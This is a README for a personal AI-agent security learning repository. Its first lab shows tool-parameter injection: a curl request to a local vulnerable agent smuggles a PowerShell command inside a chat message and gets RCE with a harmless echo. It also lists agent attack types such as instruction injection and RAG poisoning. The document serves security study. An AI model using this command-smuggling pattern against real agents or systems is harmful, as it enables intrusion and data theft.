# 🔐 AI Security Labs — Offensive Learning Repository
```md
## 💣 Proof of Exploit
{
  "result": "hacked"
}
---

## 🧱 Architecture

User → Agent → Tool → System Command

Vulnerability: Untrusted input passed directly into execution layer

This repository documents my hands-on learning in **AI + Agent Security**, focusing on real-world vulnerability patterns such as:

* Tool Injection
* Execution Injection (RCE)
* Instruction Injection
* Data Leakage
* Auth & Privilege Failures

---

## 🧠 Methodology

For each vulnerability:

1. Identify pattern
2. Break into:

   * Entry → Trust → Flow → Failure → Impact
3. Exploit manually
4. Observe system behavior
5. Convert into automated tests

---

## ⚔️ Lab 1 — Tool Parameter Injection → RCE

### Summary

A vulnerable AI-agent-like system blindly passes user-controlled input into a system command, resulting in **Remote Code Execution (RCE)**.

---

### Exploit Example

`bash
curl -X POST http://127.0.0.1:3000/agent \
-H "Content-Type: application/json" \
-d '{"message": "transfer $1000 to powershell -c echo hacked"}'
```

---

### Result

```json
{
  "result": "hacked"
}
```

---

## 🚨 Impact
* Full Remote Code Execution (RCE) — attacker can execute arbitrary OS commands
* Arbitrary command execution
* System compromise
* Data exfiltration
---

### Skills Demonstrated

* Vulnerability analysis
* Exploit development
* Manual + automated testing
* Understanding AI-agent attack surfaces

---

## 🚀 Next Labs

* Instruction Injection
* Multi-tool agent exploitation
* RAG poisoning
* Auth & privilege escalation
